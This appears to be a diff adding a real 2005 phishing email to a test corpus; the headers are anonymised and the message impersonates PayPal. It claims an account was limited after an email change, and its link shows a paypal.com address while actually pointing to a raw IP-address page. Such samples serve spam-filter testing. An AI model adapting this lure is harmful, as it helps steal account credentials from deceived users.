@@ -1,0 +1,59 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 3AD862A88C
+ for <user@example.com>; Thu, 14 Jul 2005 08:17:47 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 36E87621CCD; Thu, 14 Jul 2005 08:17:47 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 1E8ED621CC7
+ for <user@example.com>; Thu, 14 Jul 2005 08:17:47 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id IAA05596
+ for user@example.com; Thu, 14 Jul 2005 08:17:46 -0400
+Received: from mail.com (delfinnet.rdsct.ro [81.196.163.82])
+ by mail.example.com with SMTP id IAA05588
+ for <user@example.com>; Thu, 14 Jul 2005 08:17:45 -0400
+Message-Id: <200507141217.IAA05588@mail.example.com>
+Reply-To: <service@paypal.com>
+From: "Paypal" <service@paypal.com>
+Subject: Paypal - Email Change Requested.
+Date: Thu, 14 Jul 2005 15:18:15 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 32
+
+<HTML> 
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif">Dear Paypal Customer,</font></p>
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif">You have added justin38@yahoo.com 
+  as a new email address for your PayPal account. </font></p>
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif">Therefore, as a preventative 
+  measure, we have temporarily limited access<br>
+  to sensitive Paypal account features.</font></p>
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif"><br>
+  Click here in order to regain access to your account :</font></p>
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif"><a href="http://203.204.230.105/~jim/1/.user8923847189328719028320198413242832432890dshfdshKJasd9087132890qw890d8asjdashKHJHgkasdg897UHJHGAJHSGYHGYAS778632/paypal/" target="_blank">https://www.paypal.com/us/fq/ac=AgXbgHbg5kBErQ6p1CMgRQA4or1Eydl2FhLW3Ku0wMykpxcu8Ob.kCvAl6K9u3XTCd5.7LaiQxA&t=pr</a></font></p>
+<p> <font size="2" face="Geneva, Arial, Helvetica, sans-serif"><br>
+  Thank you for using PayPal!<br>
+  The PayPal Team </font></p>
+<p><font size="2" face="Geneva, Arial, Helvetica, sans-serif"><br>
+  -------------------------------------------------------------------------------------------------------<br>
+  Please do not reply to this email. This mailbox is not monitored and you <br>
+  will not receive a response. For assistance, log in to your PayPal <br>
+  account and click the Help link located in the topright corner of <br>
+  any PayPal page.<br>
+  ------------------------------------------------------------------------------------------------------<br>
+  PayPal Email ID PP315</font></p>
+  <p>&nbsp;</p>
+</HTML>
